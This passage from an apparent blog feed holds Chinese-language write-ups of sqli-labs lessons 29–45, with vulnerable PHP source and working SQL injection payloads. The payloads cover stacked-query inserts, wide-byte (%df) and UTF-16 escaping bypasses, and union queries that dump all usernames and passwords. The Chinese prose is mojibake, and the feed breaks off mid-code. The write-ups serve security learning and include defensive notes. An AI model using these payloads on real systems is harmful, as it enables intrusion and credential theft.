      <title>SQL:sqlilabs less-38-45:å †å æ³¨å…¥</title>
      <link href="2021/07/16/sql-sqlilabs-less-38-45-dui-die-zhu-ru/"/>
      <url>2021/07/16/sql-sqlilabs-less-38-45-dui-die-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>æºä»£ç ï¼š</p><pre><code>`// take the variables if(isset($_GET['id'])){$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id."\n");fclose($fp);// connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);// Check connectionif (mysqli_connect_errno($con1)){    echo "Failed to connect to MySQL: " . mysqli_connect_error();}else{    @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database: $dbname");}$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>ç”±äºŽåœ¨è¿™é‡Œä½¿ç”¨äº†æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªsqlè¯­å¥çš„å‡½æ•°mysqli_multi_queryã€‚<br>  æ‰€ä»¥å¯ä»¥å°è¯•å †å æ³¨å…¥ï¼Œå †å æ³¨å…¥å°±æ˜¯æ‰§è¡Œå¤šæ¡SQLè¯­å¥ï¼Œé€šè¿‡;åˆ†å‰²ï¼›åœ¨å®žæˆ˜ä¸­ï¼Œç”±äºŽæ­£å¸¸æ•°æ®åº“åªä¼šå›žæ˜¾å‡ºæˆ‘ä»¬æƒ³è¦çš„ç»“æžœï¼Œæ‰€ä»¥ï¼Œå †å æ³¨å…¥åœ¨é»‘ç›’æµ‹è¯•ä¸‹åªèƒ½é€šè¿‡æ¨¡ç³Šæµ‹è¯•æ¥è¿›è¡Œæµ‹è¯•ã€‚ç”±äºŽæ˜¯ç›´æŽ¥æ‰§è¡Œå¤šæ¡SQLè¯­å¥ï¼Œæ‰€ä»¥å¯¹SQLè¯­å¥å°±å¹¶æ— é™åˆ¶ï¼Œå¯ä»¥é€šè¿‡å †å æ³¨å…¥å¢žåˆ æ”¹æŸ¥ç­‰æ•°æ®åº“æ“ä½œã€‚<br> æˆ‘ä»¬åœ¨çŸ¥é“æ•°æ®åº“ç»“æž„åŽå°è¯•è¿›è¡Œæ’å…¥æ•°æ®æ“ä½œ</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=1';insert into users(id,username,password) values ('38','less38','hello')--+</code></pre><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><pre><code>// connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);// Check connectionif (mysqli_connect_errno($con1)){    echo "Failed to connect to MySQL: " . mysqli_connect_error();}else{    @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database: $dbname");}$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";/* execute multi query */if (mysqli_multi_query($con1, $sql)){    /* store first result set */    if ($result = mysqli_store_result($con1))    {        if($row = mysqli_fetch_row($result))        {            echo '&lt;font size = "5" color= "#00FF00"&gt;';                printf("Your Username is : %s", $row[1]);            echo "&lt;br&gt;";            printf("Your Password is : %s", $row[2]);            echo "&lt;br&gt;";            echo "&lt;/font&gt;";        }//            mysqli_free_result($result);    }        /* print divider */    if (mysqli_more_results($con1))    {            //printf("-----------------\n");    }     //while (mysqli_next_result($con1));}else     {    echo '&lt;font size="5" color= "#FFFF00"&gt;';    print_r(mysqli_error($con1));    echo "&lt;/font&gt;";      }</code></pre><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=1;insert into users(id,username,password) values ('39','less39','hello')--+</code></pre><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=1');insert into users(id,username,password) values ('40','less40','hello')--+</code></pre><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=1;insert into users(id,username,password) values ('41','less41','hello')--+</code></pre><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>æºä»£ç ï¼š</p><h5 id="pass-change-php"><a href="#pass-change-php" class="headerlink" title="pass_change.php"></a>pass_change.php</h5><pre><code>$username= $_SESSION["username"];$curr_pass= mysql_real_escape_string($_POST['current_password']);$pass= mysql_real_escape_string($_POST['password']);$re_pass= mysql_real_escape_string($_POST['re_password']);$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";</code></pre><h5 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h5><pre><code>$username = mysqli_real_escape_string($con1,$_POST["login_user"]);$password = $_POST["login_password"];$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";</code></pre><p>pdateæ›´æ–°æ•°æ®åŽï¼Œç»è¿‡mysql_real_escape_string()å¤„ç†åŽçš„æ•°æ®ï¼Œå­˜å…¥åˆ°æ•°æ®åº“å½“ä¸­åŽä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚åœ¨selectè°ƒç”¨çš„æ—¶å€™æ‰èƒ½å‘æŒ¥ä½œç”¨ã€‚æ‰€ä»¥ä¸ç”¨è€ƒè™‘åœ¨æ›´æ–°å¯†ç å¤„è¿›è¡Œæ³¨å…¥ï¼Œè¿™å…³å’ŒäºŒæ¬¡æ³¨å…¥çš„æ€è·¯æ˜¯ä¸ä¸€æ ·çš„ã€‚</p><p>Passwordå˜é‡åœ¨postè¿‡ç¨‹ä¸­ï¼Œæ²¡æœ‰é€šè¿‡mysql_real_escape_string()å‡½æ•°çš„å¤„ç†ã€‚å› æ­¤åœ¨ç™»å½•çš„æ—¶å€™å¯†ç é€‰é¡¹æˆ‘ä»¬å¯ä»¥è¿›è¡Œattackã€‚</p><h5 id="æ‰€ä»¥å¯†ç çš„payloadä¸º"><a href="#æ‰€ä»¥å¯†ç çš„payloadä¸º" class="headerlink" title="æ‰€ä»¥å¯†ç çš„payloadä¸º"></a>æ‰€ä»¥å¯†ç çš„payloadä¸º</h5><pre><code>a';insert into users(id,username,password) values(42,'Less42','Less42')#</code></pre><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><h5 id="pass-change-php-1"><a href="#pass-change-php-1" class="headerlink" title="pass_change.php"></a>pass_change.php</h5><pre><code>$username = mysqli_real_escape_string($con1, $_POST["login_user"]);   $password = $_POST["login_password"];   if (mysqli_connect_errno($con1)){       echo "Failed to connect to MySQL: " . mysqli_connect_error();   }   else{       @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database ######: ");   }   $sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¹å‚æ•°usernameè¿›è¡Œmysqli_real_escape_stringï¼Œpasswordæ²¡æœ‰è¿›è¡Œä»»ä½•å¤„ç†ï¼Œä¸”é—­åˆæ–¹å¼ä¸ºå•å¼•å·æ‹¬å·â€™)</p><h5 id="login-php-1"><a href="#login-php-1" class="headerlink" title="login.php"></a>login.php</h5><pre><code>$username = mysqli_real_escape_string($con1, $_POST["login_user"]);$password = $_POST["login_password"];$sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";</code></pre><h5 id="password"><a href="#password" class="headerlink" title="password"></a>password</h5><pre><code>a');insert into users(id,username,password) values(43,'Less43','Less43')#</code></pre><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><pre><code>$username = mysqli_real_escape_string($con1, $_POST["login_user"]);   $password = $_POST["login_password"];   if (mysqli_connect_errno($con1)){       echo "Failed to connect to MySQL: " . mysqli_connect_error();   }   else{       @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database ######: ");   }   $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";</code></pre><p>è¿™é‡Œé‡‡ç”¨ç›²æ³¨ï¼š</p><pre><code>a';insert into users(id,username,password) values ('44','less44','hello')#</code></pre><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><pre><code>$username = mysqli_real_escape_string($con1, $_POST["login_user"]);   $password = $_POST["login_password"];   if (mysqli_connect_errno($con1)){       echo "Failed to connect to MySQL: " . mysqli_connect_error();   }   else{       @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database ######: ");   }   $sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";</code></pre><pre><code>a');insert into users(id,username,password) values(45,'Less45','Less45')#</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs-less-32-37-å®½å­—èŠ‚æ³¨å…¥</title>
      <link href="2021/07/16/sql-sqlilabs-less-32-37-kuan-zi-jie-zhu-ru/"/>
      <url>2021/07/16/sql-sqlilabs-less-32-37-kuan-zi-jie-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>ä»£ç ä¸­å«æœ‰ï¼š</p><pre><code>function check_addslashes($string){    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);    //è¿‡æ»¤åæ–œçº¿ç¬¦å·    $string = preg_replace('/\'/i', '\\\'', $string);       //ç”¨åæ–œæ è½¬ä¹‰å•å¼•å·    $string = preg_replace('/\"/', "\\\"", $string);    //ç”¨åæ–œæ è½¬ä¹‰åŒå¼•å·    return $string;}$id=check_addslashes($_GET['id']);mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";print_r(mysql_error());</code></pre><h5 id="å…¶ä¸­ä¸‰ä¸ªpreg-replace-å‡½æ•°åˆ†åˆ«ä¸ºï¼š"><a href="#å…¶ä¸­ä¸‰ä¸ªpreg-replace-å‡½æ•°åˆ†åˆ«ä¸ºï¼š" class="headerlink" title="å…¶ä¸­ä¸‰ä¸ªpreg_replace()å‡½æ•°åˆ†åˆ«ä¸ºï¼š"></a>å…¶ä¸­ä¸‰ä¸ªpreg_replace()å‡½æ•°åˆ†åˆ«ä¸ºï¼š</h5><pre><code>1.è¿‡æ»¤åæ–œçº¿ç¬¦å·2.ç”¨åæ–œæ è½¬ä¹‰å•å¼•å·3.ç”¨åæ–œæ è½¬ä¹‰åŒå¼•å·</code></pre><p>å³ï¼šå‡½æ•°ä¸ºè¿‡æ»¤ â€˜ \ çš„å‡½æ•°ï¼Œå°† â€˜ è½¬ä¸º ' ï¼Œ å°† \ è½¬ä¸º \ ï¼Œå°† â€œ è½¬ä¸º "ã€‚</p><h5 id="æ­¤æ­¤å¤„æˆ‘ä»¬åªèƒ½è€ƒè™‘backgroundä¸­çš„ç¬¬ä¸€ä¸ªæ€è·¯ï¼Œæ·»åŠ ä¸€ä¸ª-dfåŽï¼Œå°†-5cåƒæŽ‰å³å¯ã€‚"><a href="#æ­¤æ­¤å¤„æˆ‘ä»¬åªèƒ½è€ƒè™‘backgroundä¸­çš„ç¬¬ä¸€ä¸ªæ€è·¯ï¼Œæ·»åŠ ä¸€ä¸ª-dfåŽï¼Œå°†-5cåƒæŽ‰å³å¯ã€‚" class="headerlink" title="æ­¤æ­¤å¤„æˆ‘ä»¬åªèƒ½è€ƒè™‘backgroundä¸­çš„ç¬¬ä¸€ä¸ªæ€è·¯ï¼Œæ·»åŠ ä¸€ä¸ª%dfåŽï¼Œå°†%5cåƒæŽ‰å³å¯ã€‚"></a>æ­¤æ­¤å¤„æˆ‘ä»¬åªèƒ½è€ƒè™‘backgroundä¸­çš„ç¬¬ä¸€ä¸ªæ€è·¯ï¼Œæ·»åŠ ä¸€ä¸ª%dfåŽï¼Œå°†%5cåƒæŽ‰å³å¯ã€‚</h5><p>å› æ­¤è¿›è¡Œå°è¯•ï¼š</p><pre><code>?id=1'Hint: The Query String you input is escaped as : 1\'The Query String you input in Hex becomes : 315c27</code></pre><p>å› æ­¤çˆ†æ•°æ®åº“ï¼š</p><pre><code>?id=-1%df' union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</code></pre><p>è·³è¿‡æ­¥éª¤ç›´æŽ¥çˆ†ä¿¡æ¯ï¼š</p><pre><code>?id=-1%df' union select 1,(select group_concat(username,0x3a,password) from users),3--+</code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>ä»£ç ä¸­å«æœ‰ï¼š</p><pre><code>function check_addslashes($string){    $string= addslashes($string);        return $string;}$id=check_addslashes($_GET['id']);mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";print_r(mysql_error());</code></pre><h3 id="ä»‹ç»addslashes-å‡½æ•°ï¼š"><a href="#ä»‹ç»addslashes-å‡½æ•°ï¼š" class="headerlink" title="ä»‹ç»addslashes()å‡½æ•°ï¼š"></a>ä»‹ç»addslashes()å‡½æ•°ï¼š</h3><p>addslashes() å‡½æ•°è¿”å›žåœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚</p><p>é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š</p><ul><li>å•å¼•å·ï¼ˆâ€™ï¼‰</li><li>åŒå¼•å·ï¼ˆâ€ï¼‰</li><li>åæ–œæ ï¼ˆ\ï¼‰</li></ul><p>æç¤ºï¼šè¯¥å‡½æ•°å¯ç”¨äºŽä¸ºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å­—ç¬¦ä¸²ä»¥åŠæ•°æ®åº“æŸ¥è¯¢è¯­å¥å‡†å¤‡å­—ç¬¦ä¸²ã€‚</p><p>addslashes()å‡½æ•°å’Œæˆ‘ä»¬åœ¨32å…³å®žçŽ°çš„åŠŸèƒ½åŸºæœ¬ä¸€è‡´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾æ—§å¯ä»¥åˆ©ç”¨%dfè¿›è¡Œç»•è¿‡ã€‚</p><h4 id="Noticeï¼š"><a href="#Noticeï¼š" class="headerlink" title="Noticeï¼š"></a>Noticeï¼š</h4><p>ä½¿ç”¨addslashes(),æˆ‘ä»¬éœ€è¦å°†mysql_queryè®¾ç½®ä¸ºbinaryçš„æ–¹å¼ï¼Œæ‰èƒ½é˜²å¾¡æ­¤æ¼æ´žã€‚</p><pre><code>mysql_query("SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary",$conn);</code></pre><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><p>ä¸Žless-32ä¸€è‡´</p><pre><code>?id=-1%df' union select 1,database(),3--+</code></pre><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>ä»£ç ä¸­å«æœ‰ï¼š</p><pre><code>$uname1=$_POST['uname'];$passwd1=$_POST['passwd'];$uname = addslashes($uname1);$passwd= addslashes($passwd1);mysql_query("SET NAMES gbk");@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";</code></pre><p>å¯è§è¿™é‡Œå¯¹nameå’Œpasswordè¿›è¡Œäº†postå’Œaddslasheså¤„ç†ï¼Œ%dfå¯ä»¥å°†è½¬ä¹‰çš„åæ–œæ ç»™åƒæŽ‰ã€‚è€ŒGETåž‹çš„æ–¹å¼æˆ‘ä»¬æ˜¯ä»¥urlå½¢å¼æäº¤çš„ï¼Œå› æ­¤æ•°æ®ä¼šé€šè¿‡urlencodeå¦‚ä½•å°†æ–¹æ³•ç”¨åœ¨poståž‹çš„æ³¨å…¥å½“ä¸­ï¼Œæˆ‘ä»¬æ­¤å¤„ä»‹ç»ä¸€ä¸ªæ–°çš„æ–¹æ³•ã€‚å°†utf-8è½¬æ¢ä¸ºutf-16æˆ– utf-32ï¼Œä¾‹å¦‚å°† â€˜ è½¬ä¸ºutf-16ä¸º ï¿½â€™ ã€‚æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹å¼è¿›è¡Œå°è¯•ã€‚</p><h4 id="æˆ‘tmç›´æŽ¥ç»™ä½ å…¨æ•´å‡ºæ¥ï¼š"><a href="#æˆ‘tmç›´æŽ¥ç»™ä½ å…¨æ•´å‡ºæ¥ï¼š" class="headerlink" title="æˆ‘tmç›´æŽ¥ç»™ä½ å…¨æ•´å‡ºæ¥ï¼š"></a>æˆ‘tmç›´æŽ¥ç»™ä½ å…¨æ•´å‡ºæ¥ï¼š</h4><pre class=" language-1"><code class="language-1">ï¿½'union select 1,group_concat(username,0x3a,password) from users#</code></pre><h4 id="åŒæŸ¥è¯¢åŒæ ·ä¹Ÿè¡Œ"><a href="#åŒæŸ¥è¯¢åŒæ ·ä¹Ÿè¡Œ" class="headerlink" title="åŒæŸ¥è¯¢åŒæ ·ä¹Ÿè¡Œ:"></a>åŒæŸ¥è¯¢åŒæ ·ä¹Ÿè¡Œ:</h4><pre><code>ï¿½' union select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a#</code></pre><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>æºä»£ç ï¼š</p><pre><code>function check_addslashes($string){$string = addslashes($string);return $string;}$id=check_addslashes($_GET['id']);mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</code></pre><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=-1 union select 1,database(),3--+</code></pre><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>æºä»£ç ï¼š</p><pre><code>function check_quotes($string){    $string= mysql_real_escape_string($string);        return $string;}$id=check_quotes($_GET['id']);mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";print_r(mysql_error());</code></pre><p>å¯ä»¥çœ‹åˆ°è¿™è¾¹å°±ä¸æ˜¯ç”¨addslashesäº†ï¼Œç”¨çš„mysql_real_escape_string()å‡½æ•°è¿›è¡Œçš„è¿‡æ»¤ã€‚</p><h3 id="mysql-real-escape-string-å‡½æ•°ï¼š"><a href="#mysql-real-escape-string-å‡½æ•°ï¼š" class="headerlink" title="mysql_real_escape_string()å‡½æ•°ï¼š"></a>mysql_real_escape_string()å‡½æ•°ï¼š</h3><p>mysql_real_escape_string() å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚</p><p>ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>â€˜</li><li>â€œ</li><li>\x1a</li></ul><p>å¦‚æžœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›žè¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æžœå¤±è´¥ï¼Œåˆ™è¿”å›ž falseã€‚</p><p>ä½†æ˜¯å› mysqlæˆ‘ä»¬å¹¶æ²¡æœ‰è®¾ç½®æˆgbkï¼Œæ‰€ä»¥mysql_real_escape_string()ä¾æ—§èƒ½å¤Ÿè¢«çªç ´ã€‚æ–¹æ³•å’Œä¸Šè¿°æ˜¯ä¸€æ ·çš„ã€‚</p><h5 id="1-dfçªç ´æ³•ï¼š"><a href="#1-dfçªç ´æ³•ï¼š" class="headerlink" title="1.%dfçªç ´æ³•ï¼š"></a>1.%dfçªç ´æ³•ï¼š</h5><pre><code>?id=-1%df' union select 1,user(),3--+</code></pre><h5 id="2-utf-16çªç ´ï¼š"><a href="#2-utf-16çªç ´ï¼š" class="headerlink" title="2.utf-16çªç ´ï¼š"></a>2.utf-16çªç ´ï¼š</h5><pre><code>?id=-1%EF%BF%BD%27union select 1,user(),3--+</code></pre><h4 id="è®¾ç½®mysqlä¸ºgbk"><a href="#è®¾ç½®mysqlä¸ºgbk" class="headerlink" title="è®¾ç½®mysqlä¸ºgbk"></a>è®¾ç½®mysqlä¸ºgbk</h4><pre><code>mysql_set_charset('gbk','$conn')</code></pre><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>æºä»£ç :</p><pre><code>$uname1=$_POST['uname'];$passwd1=$_POST['passwd'];$uname = mysql_real_escape_string($uname1);$passwd= mysql_real_escape_string($passwd1);mysql_query("SET NAMES gbk");@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";</code></pre><p>å¤§ä½“ä¸Šå’Œless-34ç›¸åŒï¼Œè¿™é‡Œå¤„ç†postå†…å®¹ç”¨çš„æ˜¯mysql_real_escape_string()å‡½æ•°ï¼Œè€Œä¸æ˜¯addslashes()å‡½æ•°ï¼Œç”¨ä¸‡èƒ½å¯†ç ï¼š</p><pre><code>ï¿½'union select 1,group_concat(username,0x3a,password) from users#</code></pre><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>ä»Žä¸Šé¢çš„å‡ å…³å½“ä¸­ï¼Œå¯ä»¥æ€»ç»“ä¸€ä¸‹è¿‡æ»¤ â€˜ \  å¸¸ç”¨çš„ä¸‰ç§æ–¹å¼æ˜¯ä½¿ç”¨preg_replace()ç›´æŽ¥replaceï¼Œaddslashes()ï¼Œmysql_real_escape_string()ã€‚ä¸‰ç§æ–¹å¼ä»…ä»…ä¾é ä¸€ä¸ªå‡½æ•°æ˜¯ä¸èƒ½å®Œå…¨é˜²å¾¡çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™éœ€è¦è€ƒè™‘çš„æ›´åŠ ä»”ç»†ã€‚åŒæ—¶åœ¨ä¸Šè¿°è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿç»™å‡ºä¸‰ç§é˜²å¾¡çš„æ–¹å¼ï¼š</p><ul><li><p>ä½¿ç”¨preg_replace()ç›´æŽ¥replaceæ—¶ï¼Œä¸è¦å°†mysqlç¼–ç è®¾ç½®ä¸ºgbkã€‚</p></li><li><p>ä½¿ç”¨addslashes()æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å°†mysql_queryè®¾ç½®ä¸ºbinaryçš„æ–¹å¼ï¼Œæ‰èƒ½é˜²å¾¡æ­¤æ¼æ´ž</p></li><li><p>ä½¿ç”¨mysql_real_escape_string()æ—¶ï¼Œéœ€è¦å°†mysqlè®¾ç½®ä¸ºgbkå³å¯ã€‚</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-29-31:HPPå‚æ•°æ±¡æŸ“æ”»å‡»</title>
      <link href="2021/07/16/sql-sqlilabs-less-29-31-hpp-can-shu-wu-ran-gong-ji/"/>
      <url>2021/07/16/sql-sqlilabs-less-29-31-hpp-can-shu-wu-ran-gong-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="ä»‹ç»preg-match-å‡½æ•°ï¼š-https-www-runoob-com-php-php-preg-match-html"><a href="#ä»‹ç»preg-match-å‡½æ•°ï¼š-https-www-runoob-com-php-php-preg-match-html" class="headerlink" title="ä»‹ç»preg_match()å‡½æ•°ï¼š(https://www.runoob.com/php/php-preg_match.html)"></a>ä»‹ç»preg_match()å‡½æ•°ï¼š(<a href="https://www.runoob.com/php/php-preg_match.html">https://www.runoob.com/php/php-preg_match.html</a>)</h3><p>preg_match å‡½æ•°ç”¨äºŽæ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚</p><h5 id="è¯­æ³•ï¼š"><a href="#è¯­æ³•ï¼š" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h5><pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</code></pre><p>æœç´¢ subject ä¸Ž pattern ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªåŒ¹é…ã€‚</p><p>å‚æ•°è¯´æ˜Žï¼š</p><ul><li>$pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå­—ç¬¦ä¸²å½¢å¼ã€‚</li><li>$subject: è¾“å…¥å­—ç¬¦ä¸²ã€‚</li><li>$matches: å¦‚æžœæä¾›äº†å‚æ•°matchesï¼Œå®ƒå°†è¢«å¡«å……ä¸ºæœç´¢ç»“æžœã€‚ $matches[0]å°†åŒ…å«å®Œæ•´æ¨¡å¼åŒ¹é…åˆ°çš„æ–‡æœ¬ï¼Œ $matches[1] å°†åŒ…å«ç¬¬ä¸€ä¸ªæ•èŽ·å­ç»„åŒ¹é…åˆ°çš„æ–‡æœ¬ï¼Œä»¥æ­¤ç±»æŽ¨ã€‚</li><li>$flagsï¼šflags å¯ä»¥è¢«è®¾ç½®ä¸ºä»¥ä¸‹æ ‡è®°å€¼ï¼š<ol><li>PREG_OFFSET_CAPTURE:  å¦‚æžœä¼ é€’äº†è¿™ä¸ªæ ‡è®°ï¼Œå¯¹äºŽæ¯ä¸€ä¸ªå‡ºçŽ°çš„åŒ¹é…è¿”å›žæ—¶ä¼šé™„åŠ å­—ç¬¦ä¸²åç§»é‡(ç›¸å¯¹äºŽç›®æ ‡å­—ç¬¦ä¸²çš„)ã€‚ æ³¨æ„ï¼šè¿™ä¼šæ”¹å˜å¡«å……åˆ°matcheså‚æ•°çš„æ•°ç»„ï¼Œä½¿å…¶æ¯ä¸ªå…ƒç´ æˆä¸ºä¸€ä¸ªç”± ç¬¬0ä¸ªå…ƒç´ æ˜¯åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²ï¼Œç¬¬1ä¸ªå…ƒç´ æ˜¯è¯¥åŒ¹é…å­—ç¬¦ä¸² åœ¨ç›®æ ‡å­—ç¬¦ä¸²subjectä¸­çš„åç§»é‡ã€‚</li></ol></li><li>offset: é€šå¸¸ï¼Œæœç´¢ä»Žç›®æ ‡å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®å¼€å§‹ã€‚å¯é€‰å‚æ•° offset ç”¨äºŽ æŒ‡å®šä»Žç›®æ ‡å­—ç¬¦ä¸²çš„æŸä¸ªæœªçŸ¥å¼€å§‹æœç´¢(å•ä½æ˜¯å­—èŠ‚)ã€‚</li></ul><h5 id="è¿”å›žå€¼ï¼š"><a href="#è¿”å›žå€¼ï¼š" class="headerlink" title="è¿”å›žå€¼ï¼š"></a>è¿”å›žå€¼ï¼š</h5><p>è¿”å›ž pattern çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯ 0 æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ– 1 æ¬¡ï¼Œå› ä¸º preg_match() åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…åŽ  å°†ä¼šåœæ­¢æœç´¢ã€‚preg_match_all() ä¸åŒäºŽæ­¤ï¼Œå®ƒä¼šä¸€ç›´æœç´¢subject ç›´åˆ°åˆ°è¾¾ç»“å°¾ã€‚ å¦‚æžœå‘ç”Ÿé”™è¯¯preg_match()è¿”å›ž  FALSEã€‚</p><h3 id="Less-29ï¼š"><a href="#Less-29ï¼š" class="headerlink" title="Less-29ï¼š"></a>Less-29ï¼š</h3><p>æºç ä¸­SQLè¯­å¥å¦‚ä¸‹ï¼š</p><pre><code>$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>ä½¿ç”¨å‰é¢çš„æ³¨å…¥æ–¹æ³•è¿›è¡Œæ³¨å…¥ï¼š</p><pre><code>login.php?id=-1' union select 1,database(),3--+</code></pre><p>æºç ï¼š</p><pre><code>function whitelist($input){    $match = preg_match("/^\d+$/", $input); //è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ æ„æ€æ˜¯ åŒ¹é… ä»¥æ•°å­—å¼€å¤´çš„ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ä¸”ä»¥æ•°å­—ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚    if($match)    {        //echo "you are good";        //return $match;    }    else    {            header('Location: hacked.php');        //echo "you are bad";    }}</code></pre><p>ç„¶åŽï¼Œæˆ‘ä»¬å‘çŽ°inputå°±æ˜¯id1,id1æ¥è‡ªäºŽjava,implimentation</p><p>(qs)</p><pre><code>$qs = $_SERVER['QUERY_STRING']; //èŽ·å–æŸ¥è¯¢è¯­å¥ï¼ŒèŽ·å–çš„æ˜¯URLä¸­?åŽé¢çš„å€¼$id1=java_implimentation($qs);$id=$_GET['id'];whitelist($id1);</code></pre><p>æŽ¥ç€ï¼ŒæŸ¥çœ‹java_implimentation()æ–¹æ³•ï¼Œå‘çŽ°è¿™ä¸ªæ–¹æ³•æ˜¯ç”¨æ¥æ¨¡æ‹ŸHPPçš„ï¼Œæ„æ€å°±æ˜¯è¯´è¿™ä¸ªæ–¹æ³•å­˜åœ¨HPPæ¼æ´žæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ã€‚</p><pre><code>// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).//å½“å—åˆ°HPPï¼ˆHTTPå‚æ•°æ±¡æŸ“ï¼‰çš„å½±å“æ—¶ï¼Œä»¥ä¸‹åŠŸèƒ½å¯æ¨¡ä»¿å‚æ•°çš„è¡Œä¸ºã€‚function java_implimentation($query_string){    $q_s = $query_string;    $qs_array= explode("&amp;",$q_s); //æ ¹æ®&amp;åˆ†å‰²å­—ç¬¦ä¸²å¹¶æ‰“æ•£ä¸ºæ•°ç»„    foreach($qs_array as $key 